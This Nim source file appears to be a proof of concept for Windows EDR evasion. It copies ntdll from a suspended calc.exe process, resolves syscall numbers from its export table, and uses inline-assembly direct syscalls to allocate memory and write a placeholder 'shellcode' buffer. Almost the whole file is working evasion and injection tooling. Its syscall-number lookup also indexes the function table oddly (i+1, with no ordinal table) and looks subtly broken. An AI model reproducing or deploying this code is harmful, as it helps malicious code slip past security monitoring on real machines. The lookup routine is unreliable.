import winim/inc/psapi
import winim/[lean, winstr, utils]
import std/[strformat, strutils]
import osproc

proc get_error_message(err_code: DWORD): string =
    var pBuffer = newWString(512)
    FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM or FORMAT_MESSAGE_IGNORE_INSERTS,
                   NULL,
                   err_code,
                   cast[DWORD](MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT)),
                   pBuffer,
                   cast[DWORD](pBuffer.len),
                   NULL);
    nullTerminate(pBuffer)
    var errMsg = %$pBuffer
    return strip(errMsg)

proc err(msg: string, get_err = true) =
    if get_err:
        var err_code = GetLastError()
        var err_msg = get_error_message(err_code)
        echo(fmt"[!] {msg}: (Err: {err_code}) {err_msg}")
    else:
        echo(fmt"[!] {msg}")
    quit(QuitFailure)

proc err(msg: string, nt_status_code: NTSTATUS) =
    var err_code = RtlNtStatusToDosError(nt_status_code)
    var err_msg = get_error_message(err_code)
    echo(fmt"[!] {msg}: (Err: {err_code}) {err_msg}")
    quit(QuitFailure)


type ParsedPE = object
    base_addr: QWORD
    dos_header: PIMAGE_DOS_HEADER
    nt_header: PIMAGE_NT_HEADERS
    export_dir: PIMAGE_EXPORT_DIRECTORY

var pe: ParsedPE

proc parse_pe(lpRawData: LPVOID, pe: ptr ParsedPE) =
    pe.base_addr = cast[QWORD](lpRawData)
    pe.dos_header = cast[PIMAGE_DOS_HEADER](pe.base_addr)
    pe.nt_header = cast[PIMAGE_NT_HEADERS](pe.base_addr + pe.dos_header.e_lfanew)
    var export_dir_rva = pe.nt_header.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
    pe.export_dir = cast[PIMAGE_EXPORT_DIRECTORY](pe.base_addr + export_dir_rva)

proc get_ssn(fn_name: string, pe: ptr ParsedPE): DWORD =
    var num_of_names = pe.export_dir.NumberOfNames
    var names_addr = pe.base_addr + pe.export_dir.AddressOfNames
    var fns_addr = pe.base_addr + pe.export_dir.AddressOfFunctions
    for i in 0..<num_of_names:
        var pName = cast[ptr DWORD](names_addr + i * 4)
        var name = cast[LPCSTR](pe.base_addr + cast[QWORD](pName[]))
        if %$name == fn_name:
            var pFnAddrRva = cast[ptr DWORD](fns_addr + (i+1) * 4)
            var fn_addr = pe.base_addr + cast[QWORD](pFnAddrRva[])
            var ssn = (cast[ptr DWORD](fn_addr + 4))[]
            return ssn

proc get_unhook_ntdll(): seq[byte] =
    echo("[+] Creating dummy process")
    var dummy_proc = startProcess("calc.exe")
    echo(fmt"    PID: {dummy_proc.processID()}")
    defer:
        echo("[+] Killing dummy process")
        dummy_proc.terminate()
        dummy_proc.close()
    dummy_proc.suspend()
    var hDummy = OpenProcess(PROCESS_ALL_ACCESS, false, cast[DWORD](dummy_proc.processID()))
    defer: CloseHandle(hDummy)
    var hNtDll = GetModuleHandleA("ntdll.dll")
    var modinfo: MODULEINFO
    var hCurr = GetCurrentProcess()
    defer: CloseHandle(hCurr)
    var ret = GetModuleInformation(hCurr, hNtDll, addr modinfo, cast[DWORD](sizeof(modinfo)))
    if ret == 0:
        echo("[+] Killing dummy process")
        dummy_proc.terminate()
        dummy_proc.close()
        err("GetModuleInformation")
    var buffer: seq[byte]
    newSeq(buffer, modinfo.SizeOfImage)
    var nb: SIZE_T
    ret = ReadProcessMemory(hDummy, modinfo.lpBaseOfDll, addr buffer[0], modinfo.SizeOfImage, addr nb)
    if ret == 0:
        echo("[+] Killing dummy process")
        dummy_proc.terminate()
        dummy_proc.close()
        err("ReadProcessMemory")
    return buffer

{.passC:"-masm=intel".}

var navm_ssn: DWORD = 0
var nwvm_ssn: DWORD = 0

proc NAVM(ProcessHandle: HANDLE, BaseAddress: LPVOID, ZeroBits: ULONG_PTR, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.asmNoStackFrame.} =
    # i: immediate
    # r: register
    # m: memory
    asm """
    mov r10, rcx
    mov eax, %[ssn]
    syscall
    ret
    :
    : [ssn] "irm" (`navm_ssn`)
    """

proc NWVM(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: ULONG, NumberOfBytesWritten: PULONG): NTSTATUS {.asmNoStackFrame.} =
    asm """
    mov r10, rcx
    mov eax, %[ssn]
    syscall
    ret
    :
    : [ssn] "irm" (`nwvm_ssn`)
    """

proc main() =
    echo("[+] Getting unhook ntdll from suspended process")
    var unhook_ntdll = get_unhook_ntdll()
    var unhook_ntdll_ptr = addr unhook_ntdll[0]
    parse_pe(unhook_ntdll_ptr, addr pe)

    navm_ssn = get_ssn("NtAllocateVirtualMemory", addr pe)
    nwvm_ssn = get_ssn("NtWriteVirtualMemory", addr pe)

    var hTarget = GetCurrentProcess()
    var baseAddress: ULONG_PTR
    var regionSize: SIZE_T = 0x800
    var ret: NTSTATUS
    echo("[+] NtAllocateVirtualMemory")
    ret = NAVM(hTarget, addr baseAddress, 0, addr regionSize, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
    if ret != STATUS_SUCCESS:
        err("NtAllocateVirtualMemory", ret)
    echo(fmt"    Address: {baseAddress.toHex()}")

    echo("[+] NtWriteVirtualMemory")
    var nb: ULONG
    var sc = ['d', 'e', 'a', 'd', 'b', 'e', 'e', 'f']
    ret = NWVM(hTarget, cast[PVOID](baseAddress), addr sc[0], cast[ULONG](sc.len), addr nb)
    if ret != STATUS_SUCCESS:
        err("NtWriteVirtualMemory", ret)
    echo(fmt"    Shellcode injected")

    discard stdin.readLine()

when isMainModule:
    main()
